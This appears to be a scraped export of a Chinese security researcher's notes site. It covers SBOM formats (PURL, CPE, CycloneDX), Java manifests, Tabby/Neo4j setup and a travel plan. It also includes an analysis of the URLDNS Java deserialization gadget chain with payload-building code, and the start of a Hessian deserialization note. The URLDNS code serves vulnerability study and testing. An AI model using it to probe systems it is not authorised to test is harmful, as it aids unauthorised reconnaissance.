\npkg:golang/google.golang.org/genproto#googleapis/api/annotations\n \npkg:maven/org.apache.xmlgraphics/batik-anim@1.9.1?packaging=sources\npkg:maven/org.apache.xmlgraphics/batik-anim@1.9.1?repository_url=repo.spring.io%2Frelease\n \npkg:npm/%40angular/animation@12.3.1\npkg:npm/foobar@12.3.1\n \npkg:nuget/EnterpriseLibrary.Common@6.0.1304\n \npkg:pypi/django@1.11.1\n \npkg:rpm/fedora/curl@7.50.3-1.fc25\npkg:rpm/opensuse/curl@7.56.1-1.1.?arch=i386&amp;distro=opensuse-tumbleweed\n完整的标准内容可参考 purl-spec/PURL-SPECIFICATION.rst at master · package-url/purl-spec (github.com)\nCommon Platform Enumeration (CPE)\nCPE 是信息技术系统、软件和包的结构化命名方案。基于统一资源标识符 (URI) 的通用语法，CPE 包括正式名称格式、根据系统检查名称的方法以及将文本和测试绑定到名称的描述格式。\n以下是 CPE 产品词典的当前 官方版本。该词典提供了一份商定的官方 CPE 名称列表。该词典以 XML 格式提供，可供公众使用。请经常回来查看，因为 CPE 产品词典将继续增长以包括所有过去、现在和未来的产品版本。当修改或添加新名称时，CPE 词典每晚更新一次。\n\nnvd.nist.gov/products/cpe\n\n自 2009 年 12 月起，美国国家漏洞数据库正在接受对官方 CPE 词典的投稿。有兴趣提交 CPE 名称的组织应通过 cpe_dictionary@nist.gov 联系 NVD CPE 团队，以寻求处理其提交的帮助。\n由 NIST 托管和维护的 CPE 词典可由非政府组织自愿使用，在美国不受版权保护。但是，NIST 会赞赏署名。\nCPE 目前最新 标准 版本为 2.3，例如对于 internet_explorer ，使用 well-formed CPE name (WFN) 方法\nwfn:[part=&quot;a&quot;,vendor=&quot;microsoft&quot;,product=&quot;internet_explorer&quot;,\nversion=&quot;8\\.0\\.6001&quot;,update=&quot;beta&quot;]\n\n它的 CPE URL Binding（兼容 2.2）格式如下\ncpe:/a:microsoft:internet_explorer:8.0.6001:beta\n\n当携带 Formatted String Binding（2.3 新增）时，其格式如下\ncpe:2.3:a:microsoft:internet_explorer:8.0.6001:beta:*:*:*:*:*:*\n\n并提供了正则表达式用于检查，见 xsd:anyURI 和 xsd:pattern\n&lt;xsd:simpleType name=&quot;cpe22Type&quot;&gt;\n  &lt;xsd:annotation&gt;\n    &lt;xsd:documentation xml:lang=&quot;en&quot;&gt;Define the format for acceptable CPE Names. A URN format is used with the id starting with the word cpe followed by :/ and then some number of individual components separated by colons.&lt;/xsd:documentation&gt;\n  &lt;/xsd:annotation&gt;\n  &lt;xsd:restriction base=&quot;xsd:anyURI&quot;&gt;\n    &lt;xsd:pattern value=&quot;[c][pP][eE]:/[AHOaho]?(:[A-Za-z0-9\\._\\-~%]*){0,6}&quot;/&gt;\n  &lt;/xsd:restriction&gt;\n&lt;/xsd:simpleType&gt;\n \n&lt;xsd:simpleType name=&quot;cpe23Type&quot;&gt;\n  &lt;xsd:annotation&gt;\n    &lt;xsd:documentation xml:lang=&quot;en&quot;&gt;Define the format for acceptable CPE Names. A string format is used with the id starting with the word cpe:2.3 followed by : and then some number of individual components separated by colons.&lt;/xsd:documentation&gt;\n  &lt;/xsd:annotation&gt;\n  &lt;xsd:restriction base=&quot;xsd:string&quot;&gt;\n    &lt;xsd:pattern value=&quot;cpe:2\\.3:[aho\\*\\-](:(((\\?*|\\*?)([a-zA-Z0-9\\-\\._]|(\\\\[\\\\\\*\\?!&quot;#$$%&amp;&#039;\\(\\)\\+,/:;&lt;=&gt;@\\[\\]\\^`\\{\\|}~]))+(\\?*|\\*?))|[\\*\\-])){5}(:(([a-zA-Z]{2,3}(-([a-zA-Z]{2}|[0-9]{3}))?)|[\\*\\-]))(:(((\\?*|\\*?)([a-zA-Z0-9\\-\\._]|(\\\\[\\\\\\*\\?!&quot;#$$%&amp;&#039;\\(\\)\\+,/:;&lt;=&gt;@\\[\\]\\^`\\{\\|}~]))+(\\?*|\\*?))|[\\*\\-])){4}&quot;/&gt;\n  &lt;/xsd:restriction&gt;\n&lt;/xsd:simpleType&gt;\nVulnerabilities\nvulnerabilities 字段的格式\n{\n  &quot;bomFormat&quot;: &quot;CycloneDX&quot;,\n  &quot;specVersion&quot;: &quot;1.4&quot;,\n  &quot;version&quot;: 1,\n  &quot;vulnerabilities&quot;: [\n    {\n      &quot;bom-ref&quot;: &quot;pkg:maven/org.eclipse.aether/aether-api@1.0.0.v20140518?package-id=9829ceca9410ef7e&quot;,\n      &quot;id&quot;: &quot;CVE-2018-7489&quot;,\n      &quot;source&quot;: {\n        &quot;name&quot;: &quot;NVD&quot;,\n        &quot;url&quot;: &quot;nvd.nist.gov/vuln/detail/CVE-2019-9997&quot;\n      },\n      &quot;references&quot;: [\n        {\n          &quot;id&quot;: &quot;GHSA-6phf-73q6-gh87&quot;,\n          &quot;source&quot;: &quot;github.com/advisories/GHSA-6phf-73q6-gh87&quot;\n        }\n      ],\n      &quot;ratings&quot;: [\n        {\n          &quot;source&quot;: {\n            &quot;name&quot;: &quot;NVD&quot;,\n            &quot;url&quot;: &quot;url&quot;\n          },\n          &quot;score&quot;: 9.8,\n          &quot;severity&quot;: &quot;critical&quot;,\n          &quot;method&quot;: &quot;CVSSv3&quot;,\n          &quot;vector&quot;: &quot;AN/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&quot;\n        }\n      ],\n      &quot;cwes&quot;: [\n        184,\n        502\n      ],\n      &quot;description&quot;: &quot;description&quot;,\n      &quot;detail&quot;: &quot;detail&quot;,\n      &quot;recommendation&quot;: &quot;recommendation&quot;,\n      &quot;advisories&quot;: [\n        {\n          &quot;title&quot;: &quot;NVD&quot;,\n          &quot;url&quot;: &quot;nvd.nist.gov/vuln/detail/CVE-2019-10086&quot;\n        }\n      ],\n      &quot;created&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;published&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;updated&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;credits&quot;: {\n        &quot;name&quot;: &quot;name&quot;,\n        &quot;email&quot;: &quot;email&quot;,\n        &quot;phone&quot;: &quot;phone&quot;\n      },\n      &quot;analysis&quot;: {\n        &quot;state&quot;: &quot;not_affected&quot;,\n        &quot;justification&quot;: &quot;code_not_reachable&quot;,\n        &quot;response&quot;: [\n          &quot;will_not_fix&quot;,\n          &quot;update&quot;\n        ],\n        &quot;detail&quot;: &quot;detail&quot;\n      },\n      &quot;affects&quot;: [\n        {\n          &quot;ref&quot;: &quot;bom-ref&quot;,\n          &quot;versions&quot;: [\n            {\n              &quot;version&quot;: &quot;version&quot;,\n              &quot;status&quot;: &quot;affected&quot;\n            },\n            {\n              &quot;range&quot;: &quot;versions&quot;,\n              &quot;status&quot;: &quot;affected&quot;\n            }\n          ]\n        }\n      ],\n      &quot;properties&quot;: [\n        {\n          &quot;name&quot;: &quot;name&quot;,\n          &quot;value&quot;: &quot;value&quot;\n        }\n      ]\n    }\n  ]\n}\n影响版本字段，版本的表示形式有两种，\n\n单个 version\n范围 range。\n\n而 range 的格式规范，Cyclondx标准 中提到的是 PURL 中定义的 VERSION-RANGE-SPEC ，目前该格式标准在 PUR L 中已经删除。在 Cyclonedx 的官方 示例 中有采用下面这样的格式\n&quot;versions&quot;: [\n\t{\n\t\t&quot;range&quot;: &quot;vers:generic/&gt;=4.5|&lt;=5.0&quot;,\n\t\t&quot;status&quot;: &quot;affected&quot;\n\t}\n]\n示例\n@startjson\n{\n  &quot;bomFormat&quot;: &quot;CycloneDX&quot;,\n  &quot;specVersion&quot;: &quot;1.4&quot;,\n  &quot;version&quot;: 1,\n  &quot;components&quot;: [\n    {\n      &quot;bom-ref&quot;: &quot;pkg:maven/org.eclipse.aether/aether-api@1.0.0.v20140518?package-id=cc6e954335dcb0ad&quot;,\n      &quot;mime-type&quot;: &quot;application/java-archive&quot;,\n      &quot;type&quot;: &quot;library&quot;,\n      &quot;group&quot;: &quot;org.eclipse.aether&quot;,\n      &quot;name&quot;: &quot;aether-api&quot;,\n      &quot;version&quot;: &quot;1.0.0.v20140518&quot;,\n      &quot;purl&quot;: &quot;pkg:maven/org.eclipse.aether/aether-api@1.0.0.v20140518&quot;,\n      &quot;properties&quot;: [\n        {\n          &quot;name&quot;: &quot;coffsca:package:foundBy&quot;,\n          &quot;value&quot;: &quot;java-cataloger&quot;\n        },\n        {\n          &quot;name&quot;: &quot;coffsca:package:language&quot;,\n          &quot;value&quot;: &quot;java&quot;\n        },\n        {\n          &quot;name&quot;: &quot;coffsca:package:metadataType&quot;,\n          &quot;value&quot;: &quot;JavaMetadata&quot;\n        },\n        {\n          &quot;name&quot;: &quot;coffsca:package:type&quot;,\n          &quot;value&quot;: &quot;java-archive&quot;\n        }\n      ]\n    }\n  ],\n  &quot;vulnerabilities&quot;: [\n    {\n      &quot;bom-ref&quot;: &quot;pkg:maven/org.eclipse.aether/aether-api@1.0.0.v20140518?package-id=9829ceca9410ef7e&quot;,\n      &quot;id&quot;: &quot;CVE-2018-7489&quot;,\n      &quot;source&quot;: {\n        &quot;name&quot;: &quot;NVD&quot;,\n        &quot;url&quot;: &quot;nvd.nist.gov/vuln/detail/CVE-2019-9997&quot;\n      },\n      &quot;references&quot;: [\n        {\n          &quot;id&quot;: &quot;GHSA-6phf-73q6-gh87&quot;,\n          &quot;source&quot;: &quot;github.com/advisories/GHSA-6phf-73q6-gh87&quot;\n        }\n      ],\n      &quot;ratings&quot;: [\n        {\n          &quot;source&quot;: {\n            &quot;name&quot;: &quot;NVD&quot;,\n            &quot;url&quot;: &quot;url&quot;\n          },\n          &quot;score&quot;: 9.8,\n          &quot;severity&quot;: &quot;critical&quot;,\n          &quot;method&quot;: &quot;CVSSv3&quot;,\n          &quot;vector&quot;: &quot;AN/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&quot;\n        }\n      ],\n      &quot;cwes&quot;: [\n        184,\n        502\n      ],\n      &quot;description&quot;: &quot;description&quot;,\n      &quot;detail&quot;: &quot;detail&quot;,\n      &quot;recommendation&quot;: &quot;recommendation&quot;,\n      &quot;advisories&quot;: [\n        {\n          &quot;title&quot;: &quot;NVD&quot;,\n          &quot;url&quot;: &quot;nvd.nist.gov/vuln/detail/CVE-2019-10086&quot;\n        }\n      ],\n      &quot;created&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;published&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;updated&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;credits&quot;: {\n        &quot;name&quot;: &quot;name&quot;,\n        &quot;email&quot;: &quot;email&quot;,\n        &quot;phone&quot;: &quot;phone&quot;\n      },\n      &quot;analysis&quot;: {\n        &quot;state&quot;: &quot;not_affected&quot;,\n        &quot;justification&quot;: &quot;code_not_reachable&quot;,\n        &quot;response&quot;: [\n          &quot;will_not_fix&quot;,\n          &quot;update&quot;\n        ],\n        &quot;detail&quot;: &quot;detail&quot;\n      },\n      &quot;affects&quot;: [\n        {\n          &quot;ref&quot;: &quot;bom-ref&quot;,\n          &quot;versions&quot;: [\n            {\n              &quot;version&quot;: &quot;version&quot;,\n              &quot;status&quot;: &quot;affected&quot;\n            },\n            {\n              &quot;range&quot;: &quot;versions&quot;,\n              &quot;status&quot;: &quot;affected&quot;\n            }\n          ]\n        }\n      ],\n      &quot;properties&quot;: [\n        {\n          &quot;name&quot;: &quot;name&quot;,\n          &quot;value&quot;: &quot;value&quot;\n        }\n      ]\n    }\n  ]\n}\n@endjson\n参考\n\ncpe.mitre.org/specification/\ncybox.mitre.org/language/version2.0.1/xsddocs/extensions/platform/cpe2.3/1.0.1/cpe-naming_2_3_xsd.html#:~:text=Define%20the%20format%20for%20acceptable%20CPE%20Names.%20A,some%20number%20of%20individual%20components%20separated%20by%20colons.\ne-url/purl-spec · GitHub\nSemantic Versioning 2.0.0 | Semantic Versioning\nCyclonedx Range\nbom-examples/vex.json at master · CycloneDX/bom-examples · GitHub\nRPM::NEVRA - Parses, validates NEVRA format - metacpan.org\n"},"archived/projects/supply-chains/software-component-analysis/sbom/Software-Bill-of-Materials-(SBOM)":{"title":"Software Bill of Materials (SBOM)","links":[],"tags":[],"content":"SBOM(Software Bill of Material，软件物料清单)的概念源自制造业，其中物料清单 BOM 是用来详细说明产 品中包含的所有项目的清单。例如在汽车行业，制造商为每辆车提供一份详细的物料清单，列出原始设备制造 商制造的部件以及来自第三方供应商的部件。当发现有缺陷的部件时，汽车制造商可以准确地知道哪些车辆受 到影响，进而通知车主维修或更换。\n通用 SBOM 属性主要包括基线属性集、未确定的属性值、映射到现有的格式、组件关系以及附加元素，如图所示\n\n已有 SBOM 格式标准，SPDX、CyclonedX 和 SWID 等。"},"archived/projects/supply-chains/software-component-analysis/sbom/如何构建高质量的-SBOM-清单":{"title":"如何构建高质量的 SBOM 清单","links":[],"tags":["bom"],"content":"\n原文，How to Make High-Quality SBOMs By John Speed Meyers, Chainguard。\n\n作者在文章里提到衡量 SBOM 的一种标准，National Telecommunications and Information Administration (NTIA) minimum elements standard。并提及了目前公开的两种 SBOM 质量衡量工具，\n\ngithub.com/spdx/ntia-conformance-checker\ngithub.com/eBay/sbom-scorecard\n\n例如，这些工具会衡量 SBOM 文件中的 Component 是否具有包 Id（PURL 或者 CPE）、版本和开源协议等信息等。此外 sbom-scorecard 还提供了网页端的工具，sbom-scorecard，以便快速进行使用。\n另外，作者提到了一个数据集 bom-shelter，其中包含了来自公开渠道或者实验室中构造的 SBOM 文件，这些文件由不同的工具创建，共计 3000 个。作者对这些文件使用上述的工具进行评估，发现只有 1% 是符合“高质量”地标准的。\n最后作者对构建高质量的 SBOM 清单给出了如下建议步骤：\n\n使用上述或其他工具，衡量你生成的 SBOM 质量。\n改进使用的 SBOM 生成工具，如共享代码，提出 Issue 等，或者使用更好的工具。\n加入 SBOM 的第三方库的开发中，贡献代码。\n\n参考\n\nwww.chainguard.dev/unchained/are-sboms-good-enough-for-government-work\nwww.chainguard.dev/unchained/are-sboms-any-good-preliminary-measurement-of-the-quality-of-open-source-project-sboms\nopenssf.org/blog/2023/03/02/how-to-make-high-quality-sboms/\n"},"archived/projects/supply-chains/software-component-analysis/工具开发/CycloneDX-VEX-的使用":{"title":"CycloneDX VEX 的使用","links":[],"tags":["ves"],"content":"聚合 deps.dev 和 osv.dev 的信息，用于构建 SBOM 文件。\nCycloneDX 的 Vulnerabilities 字段的标准格式定义如下\n@startjson\n{\n  &quot;bomFormat&quot;: &quot;CycloneDX&quot;,\n  &quot;specVersion&quot;: &quot;1.4&quot;,\n  &quot;version&quot;: 1,\n  &quot;vulnerabilities&quot;: [\n    {\n      &quot;id&quot;: &quot;CVE-2018-7489&quot;,\n      &quot;source&quot;: {\n        &quot;name&quot;: &quot;NVD&quot;,\n        &quot;url&quot;: &quot;nvd.nist.gov/vuln/detail/CVE-2019-9997&quot;\n      },\n      &quot;ratings&quot;: [\n        {\n          &quot;source&quot;: {\n            &quot;name&quot;: &quot;NVD&quot;,\n            &quot;url&quot;: &quot;url&quot;\n          },\n          &quot;score&quot;: 9.8,\n          &quot;severity&quot;: &quot;critical&quot;,\n          &quot;method&quot;: &quot;CVSSv3&quot;,\n          &quot;vector&quot;: &quot;AN/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&quot;\n        }\n      ],\n      &quot;cwes&quot;: [\n        184,\n        502\n      ],\n      &quot;description&quot;: &quot;description&quot;,\n      &quot;recommendation&quot;: &quot;recommendation&quot;,\n      &quot;advisories&quot;: [\n        {\n          &quot;title&quot;: &quot;title&quot;,\n          &quot;url&quot;: &quot;url&quot;\n        }\n      ],\n      &quot;created&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;published&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;updated&quot;: &quot;2021-01-01T00:00:00.000Z&quot;,\n      &quot;analysis&quot;: {\n        &quot;state&quot;: &quot;not_affected&quot;,\n        &quot;justification&quot;: &quot;code_not_reachable&quot;,\n        &quot;response&quot;: [&quot;will_not_fix&quot;, &quot;update&quot;],\n        &quot;detail&quot;: &quot;detail&quot;\n      },\n      &quot;affects&quot;: [\n        {\n          &quot;ref&quot;: &quot;bom-ref&quot;\n        }\n      ]\n    }\n  ]\n}\n@endjson\n整个结构字段很多，主要关注的部分为，漏洞 ID『CVE，Github Advisory 等』，名称，描述，影响版本，对应影响的组件。\n{\n  &quot;vulnerabilities&quot;: [\n    {\n      &quot;id&quot;: &quot;CVE-2018-7489&quot;,\n      &quot;source&quot;: {\n        &quot;name&quot;: &quot;NVD&quot;,\n        &quot;url&quot;: &quot;nvd.nist.gov/vuln/detail/CVE-2019-9997&quot;\n      },\n      &quot;ratings&quot;: [\n        {\n          &quot;source&quot;: {\n            &quot;name&quot;: &quot;NVD&quot;,\n            &quot;url&quot;: &quot;url&quot;\n          },\n          &quot;score&quot;: 9.8,\n          &quot;severity&quot;: &quot;critical&quot;,\n          &quot;method&quot;: &quot;CVSSv3&quot;,\n          &quot;vector&quot;: &quot;AN/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&quot;\n        }\n      ],\n      &quot;cwes&quot;: [\n        184,\n        502\n      ],\n      &quot;description&quot;: &quot;description&quot;,\n      &quot;advisories&quot;: [\n        {\n          &quot;title&quot;: &quot;title&quot;,\n          &quot;url&quot;: &quot;url&quot;\n        }\n      ],\n      &quot;affects&quot;: [\n        {\n          &quot;ref&quot;: &quot;bom-ref&quot;\n        }\n      ]\n    }\n  ]\n}"},"archived/projects/supply-chains/software-component-analysis/工具开发/Java-MANIFEST.MF-文件":{"title":"Java MANIFEST.MF 文件","links":[],"tags":["manifest","jar"],"content":"MANIFEST.MF 是 Java 中包的描述文件，用于记录包的元信息。\n结构\n默认的 MANIFEST\n在 openjdk11 下，执行如下命令\njar cf MyJar.jar classes/\n生成的 Jar 包中的 MANIFEST 文件内容如下\nManifest-Version: 1.0\nCreated-By: 11.0.3 (AdoptOpenJDK)\n\n自定义 MANIFEST\nMANIFEST 允许自定义内容，增加字段值和描述。\n例如，有 MANIFEST 文件 manifest.txt，把它添加进 Jar 包中\njar cfm MyJar.jar manifest.txt classes/\n生成的 MANIFEST 文件内容如下\nManifest-Version: 1.0\nBuilt-By: baeldung\nCreated-By: 11.0.3 (AdoptOpenJDK)\n\nHeaders\nHeader 字段由 key 和 value 组成，形式如下\nkey: value\n\nMain Header，也就是默认生成的字段，通常提供了基础信息，如：\n\nManifest-Version: the version of the specification\nCreated-By: the tool version and vendor that created the manifest file\nMulti-Release: if true, then this is a Multi-Release Jar\nBuilt-By: this custom header gives the name of the user that created the manifest file\n\nEntry Point 和 Classpath\n可以在 MANIFEST 中指定 Jar 包的入口类以及 Classpath，从而避免运行 Jar 包时，手动指定。\n\nMain-Class: the package and name of the class with a main method (no .class extension)\nClass-Path: a space separated list of relative paths to libraries or resources，一般用的很少。\n示例如下：\n\nMain-Class: com.baeldung.Application\nClass-Path: core.jar lib/ properties/\n\nPackage 版本和封装\n以下是标准头部\n\nName: the package\nImplementation-Build-Date: the build date for the implementation\nImplementation-Title: the title of the implementation\nImplementation-Vendor: the vendor for the implementation\nImplementation-Version: the implementation version\nSpecification-Title: the title for the specification\nSpecification-Vendor: the vendor for the specification\nSpecification-Version: the specification version\nSealed: 如果为 true，则表示所有类文件都位于此 Jar 包中，默认为 false\n如，中 MySQL Connector 驱动的 Jar 包中有如下内容，描述了实现的 JDBC 标准的版本\n\nSpecification-Title: JDBC\nSpecification-Version: 4.2\nSpecification-Vendor: Oracle Corporation\nImplementation-Title: MySQL Connector/J\nImplementation-Version: 8.0.16\nImplementation-Vendor: Oracle\n\nOSGI\nOSGI bundle 中的 Jar 包的 MANIFEST 会包含如下头部：\n\nBundle-Name: title\nBundle-SymbolicName: a unique identifier\nBundle-Version: version\nImport-Package: packages and versions the bundle depends on\nExport-Package: bundle packages and versions available for use\n\nSection\nMANIFEST 文件中的 Section 分为两种，Main 和 Per-Entry。在 Main 部分的内容是每个 Jar 文件都可能出现的，而 Per-Entry 中的内容只会出现在指定的包或类名下。\nPer-Entry 中的内容优先级高于 Main 中的内容，如果出现同名字段，Per-Entry 中的内容会被采用。Per-Entry 通常存放版本和数字签名信息。见下面的示例：\n# Main Section\nImplementation-Title: baeldung-examples\nImplementation-Version: 1.0.1\nImplementation-Vendor: Baeldung\nSealed: true\n\n# Pre-Entry Section\nName: com/baeldung/utils/\nSealed: false\n\n其中，Pre-Entry Section 表示用于描述 com/baeldung/utils/ 包。\n总结\nMANIFEST.MF 中可表示包名称的字段\n\nName\nBundle-Name\nShort-Name\nExtension-Name\nImplementation-Title\n\nMANIFEST.MF 中可表示包版本的字段\n\nImplementation-Version\nSpecification-Version\nPlugin-Version\nBundle-Version\n\nMANIFEST.MF 中可表示包 LICENSE 的字段\n\nBundle-License\nPlugin-License-Name\n\n参考\n\nUnderstanding the JAR Manifest File | Baeldung\nJAR File Specification (oracle.com)\n"},"archived/travel/秦皇岛游玩计划——两天一夜":{"title":"秦皇岛游玩计划——两天一夜","links":[],"tags":[],"content":"来去车程\n\n出发\n\n北京站-秦皇岛站 7:46 - 9：25\n\n\n回程\n\n秦皇岛站-北京站 17:59 - 19:39\n\n\n\n通行\n\n公交\n\n支付宝公交码即可\n\n\n打车\n无地铁\n\n行程\n到达秦皇岛，打车前往酒店，酒店位于野生动物园北，新澳海底世界西南附近。\n\n沙滩或海边（如果只是想看看海，吹吹海风，建议避开热门景点）\n以下为非热门沙滩\n\n东山浴场\n\n秦皇岛市海港区南山街\n\n\n西浴场\n\n秦皇岛市海港区河滨路81号，燕山大学旁边\n\n\n戴河庭院休闲海滩\n\n秦皇岛市北戴河区蓝海道6号\n\n\n浅水湾浴场\n\n野生动物园旁边\n\n\n\n景点梳理，不完整\n\n山海关区\n\n山海关-老龙头景区，门票 20\n山海关-天下第一关景区，门票 40\n\n\n秦皇岛区\n\n新澳海底世界，门票 45\n野生动物园，门票 100\n西港花园，门票 46，近几件新的景点\n\n里面的月下咖啡，不推荐\n\n\n秦皇求仙入海处，门票 29\n\n\n北戴河区\n\n鸽子窝公园\n\n看日出可以不用去这里，上北边的赤土山大桥\n\n\n联峰山公园(暂停开放)\n老虎石公园\n\n秦皇岛市北戴河区北戴河中海滩路\n海边景点，\n\n\n北戴河碧螺塔海上酒吧公园\n\n秦皇岛市北戴河区海滨东海滩路中段\n海边景点，适合傍晚去，能看到灯塔和部分夜景\n\n\n\n\n\n\n餐饮\n\n北戴河刘庄夜市，专为旅客打造，不推荐\n\n菠萝糕\n\n\n燕大小吃街\n叶存利地方名吃海鲜大馅饺子，本地人不太推荐的样子\n\n三鲜，皮皮虾\n\n\n炒面皮，羊汤（可以当早餐）\n秦家味老菜馆(多个分店，半岛店最近)，本地菜，最好提前预约\n\n韭黄炒粉鸽子\n\n\n太阳城商业步行街\n熊猫餐厅\n\n在太阳城商业步行街附近\n\n\n\n"},"articles/code-analysis/tabby/Tabby-的初始化配置":{"title":"Tabby 的初始化配置","links":["til/installation/Neo4j-安装"],"tags":["tabby"],"content":"步骤\n\n参考 Neo4j 环境配置 V5 进行配置。\n\n首先，安装 Neo4j 5.10.0 版本『当前最新版本』数据库，见 Neo4j 安装。\n安装 APOC 插件\n手动安装方式，下载如下两个项目的 release 版本，注意需下载与 Neo4j 数据库兼容的版本，例如数据库版本为 v5.3.0，则下载 5.3.x 版本的 apoc\n\ngithub.com/neo4j/apoc\ngithub.com/neo4j-contrib/neo4j-apoc-procedures\n\n这里由于 tabby 需要使用调用过程 apoc.periodic.iterate，该功能在 apoc-extended 低版本中没有，至少在 5.3.1 中未找到。\n修改数据库配置\n进入数据库安装位置下的 conf 目录，\n\n打开 neo4j.conf 文件，确保如下内容配置正确\n# 注释下面的配置，允许从本地任意位置载入csv文件\n# server.directories.import=import\n \n# 允许 apoc 扩展\ndbms.security.procedures.unrestricted=jwt.security.*,apoc.*\n \n# 修改内存相关配置 \n# 可以通过官方的neo4j-admin来推荐配置内存大小，neo4j.com/docs/operations-manual/current/tools/neo4j-admin/neo4j-admin-memrec/\ndbms.memory.heap.initial_size=1G\ndbms.memory.heap.max_size=4G\ndbms.memory.pagecache.size=4G\n内存配置，可通过如下命令得到推荐配置，将输出的内容覆盖已有配置即可。\n./neo4j-admin server memory-recommendation\n\nneo4j-admin 位于 neo4j 安装目录的 bin 目录下。\n\n在 conf 目录下新建 apoc.conf 文件，写入如下内容\napoc.import.file.enabled=true\napoc.import.file.use_neo4j_config=false\n安装 Tabby-path-finder 插件\n将 tabby 的 env 目录下的 tabby-path-finder-1.0.jar，拷贝至 neo4j 数据库的 plugins 目录下\nls -l plugins/\ntotal 37560\n-rw-r--r--  1 trganda  staff      2217 Sep  6 11:32 README.txt\n-rw-r--r--  1 trganda  staff  15173707 Sep  6 11:48 apoc5plus-5.3.0.jar\n-rw-r--r--  1 trganda  staff    538418 Sep  6 11:32 neo4j-jwt-addon-1.3.0.jar\n-rw-r--r--@ 1 trganda  staff   3508493 May 18 17:08 tabby-path-finder-1.0.jar\n修改 Tabby 配置\n打开 tabby 下的 conf/settings.properties 文件，配置 neo4j 数据库的地址，用户名和密码。\ntabby.neo4j.username                      = neo4j\ntabby.neo4j.password                      = neo4j\ntabby.neo4j.url                           = bolt://127.0.0.1:7687\n\n检查配置\n启动 Neo4j 数据库后，分别执行如下命令，确认插件被成功加载\nCALL apoc.help(&#039;all&#039;)\nCALL tabby.help(&#039;all&#039;)\n\n创建数据库索引\nCREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;\nCREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;\nCREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;\nCREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;\nCREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);\nCREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);\nCREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);\nCREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);\nCREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);\nCREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);\nCREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);\n:schema //查看表库\n:sysinfo //查看数据库信息\n\n如果经过多次的导入/删除操作，图数据库占用了很多的硬盘存储，那么可以将原有的图数据库删除，重新按照上面的步骤新建图数据库，并删除所有约束\nDROP CONSTRAINT c1;\nDROP CONSTRAINT c2;\nDROP CONSTRAINT c3;\nDROP CONSTRAINT c4;\nDROP INDEX index1;\nDROP INDEX index2;\nDROP INDEX index3;\nDROP INDEX index4;\nDROP INDEX index5;\nDROP INDEX index6;\nDROP INDEX index7;\n"},"articles/security/java/gadget/URLDNS":{"title":"URLDNS","links":[],"tags":[],"content":"前置条件\n\nNone\n\n利用链分析\n该利用链多用于验证反序列化漏洞的存在，通过它能够发起 DNS 请求。调用过程如下\nGadget Chain:\n  HashMap.readObject()\n    HashMap.putVal()\n      HashMap.hash()\n        URL.hashCode()\n\n这个利用链的最终目的是调用能够发起 DNS 请求的方法。\n这个方法为 URLStreamHandler#getHostAddress()，而 URL 类中有一个成员 handler 的类型就是 URLStreamHandler。那么如何让 URL 对象反序列化时调用它呢？这里再次利用了 HashMap 的特点，hashCode 方法。\nURL 的 hashCode 方法如下\npublic synchronized int hashCode() {\n    if (hashCode != -1)\n        return hashCode;\n \n    hashCode = handler.hashCode(this);\n    return hashCode;\n}\n之后会调用 handler 的 hashCode 方法\nprotected int hashCode(URL u) {\n    int h = 0;\n \n    // Generate the protocol part.\n    String protocol = u.getProtocol();\n    if (protocol != null)\n        h += protocol.hashCode();\n \n    // Generate the host part.\n    InetAddress addr = getHostAddress(u);\n    if (addr != null) {\n        h += addr.hashCode();\n    } else {\n        String host = u.getHost();\n        if (host != null)\n            h += host.toLowerCase().hashCode();\n    }\n到这里构造 payload 的方式就很简单，代码如下\nHashMap ht = new HashMap();\nURL u = new URL(url);\n// value 并不重要，只要它能被反序列化就行\nht.put(u, &quot;&quot;);\n// 将u的hashCode设置为-1\nField f = u.getClass().getField(&quot;hashCode&quot;);\nf.setAccessible(true);\nf.set(u, -1);\n但这种方式会在调用 put 方法的时候执行一次 hashCode，从而导致发起 DNS 请求。为了避免这种情况可以自己继承 URLStreamHandler\nstatic class SilentURLStreamHandler extends URLStreamHandler {\n \n    protected URLConnection openConnection(URL u) throws IOException {\n            return null;\n    }\n \n    protected synchronized InetAddress getHostAddress(URL u) {\n            return null;\n    }\n}\n并将相关方法置空，这里不用担心反序列化时出现找不到 SilentURLStreamHandler 的问题，因为它 handler 是 transient 的。\n然后使用 URL 的另一个构造函数即可。\nURLStreamHandler handler = new SilentURLStreamHandler();\nURL u = new URL(null, url, handler);\nReferences\n\nblog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\n"},"articles/security/java/hessian/Hessian-反序列化流程分析":{"title":"Hessian 反序列化流程分析","links":[],"tags":["deserialiaztion","java","hessian"],"content":"Hessian 简介\n最近在学习 Apache Dubbo 的漏洞，故先来了解一下 Hessian。Hessian，是一种 binary 形式的 web service 协议，简单点讲它的目的是为了能够在两端之间，高效快速的传输 binary 数据（对象）。并以此来实现其它功能，RPC 和消息服务等，官网上给了一个 java 形式的 例子。\nHessian 提供了多种语言下的实现，包括 